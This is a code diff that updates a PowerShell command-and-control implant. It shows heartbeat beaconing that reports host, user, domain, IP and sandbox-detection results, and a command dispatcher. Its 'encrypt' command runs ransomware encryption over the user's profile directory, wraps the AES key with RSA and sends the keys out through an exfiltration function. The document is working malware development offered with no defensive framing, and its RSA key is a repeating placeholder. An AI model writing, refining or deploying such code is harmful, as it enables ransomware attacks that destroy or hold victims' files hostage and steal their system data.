@@ -1327,9 +1327,9 @@ function Send-Heartbeat {
         session_id       = $C2.SessionID
         hostname         = $env:COMPUTERNAME
         username         = $env:USERNAME
-        os               = (Get-CimInstance Win32_OperatingSystem).Caption
+        os_info          = (Get-CimInstance Win32_OperatingSystem).Caption
         domain           = $env:USERDOMAIN
-        internal_ip      = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
+        ip               = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
         sandbox_detected = ($detections.Count -gt 0)
         sandbox_reasons  = $detections -join ';'
         uptime           = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes
@@ -1430,8 +1430,8 @@ function Send-Exfil {
 function Invoke-CommandDispatcher {
     param($Command)
     
-    $cmdName = $Command.command
-    $args = $Command.arguments
+    $cmdName = $Command.command_type
+    $args = $Command.parameters
     $cmdID = $Command.id
     
     $result = switch ($cmdName) {
@@ -1547,17 +1547,24 @@ function Invoke-CommandDispatcher {
         }
         "encrypt" {
             try {
-                $targetDir = if ($args) { $args } else { $env:USERPROFILE }
+                $targetDir = if ($args -and $args.TargetDirectory) { $args.TargetDirectory } elseif ($args -and ([string]$args -ne "")) { $args } else { $env:USERPROFILE }
                 $aesKey = New-AESKey
                 $hmacKey = New-AESKey
                 $files = Invoke-RansomEncrypt -TargetDir $targetDir -AESKeyBase64 $aesKey.Key -HMACKeyBase64 $hmacKey.Key
-                Send-Exfil -DataType "ransomware_keys" -Data @{
-                    session_id  = $C2.SessionID
-                    aes_key     = $aesKey.Key
-                    aes_iv      = $aesKey.IV
-                    hmac_key    = $hmacKey.Key
-                    files_count = $files.Count
-                    target_dir  = $targetDir
+                
+                # Encrypt AES Key with RSA Public Key
+                $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+                $rsa.FromXmlString("<RSAKeyValue><Modulus>vT4pXQ+3JqVc6G8FJ6Yz5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>") # Provide full key in production
+                $encKeyBytes = $rsa.Encrypt([System.Text.Encoding]::UTF8.GetBytes($aesKey.Key), $false)
+                $encryptedAesKey = [Convert]::ToBase64String($encKeyBytes)
+                
+                Send-Exfil -DataType "ransomware_key" -Data @{
+                    session_id    = $C2.SessionID
+                    encrypted_key = $encryptedAesKey
+                    aes_iv        = $aesKey.IV
+                    hmac_key      = $hmacKey.Key
+                    files_count   = $files.Count
+                    target_dir    = $targetDir
                 }
                 "Encrypted $($files.Count) files in $targetDir"
             }
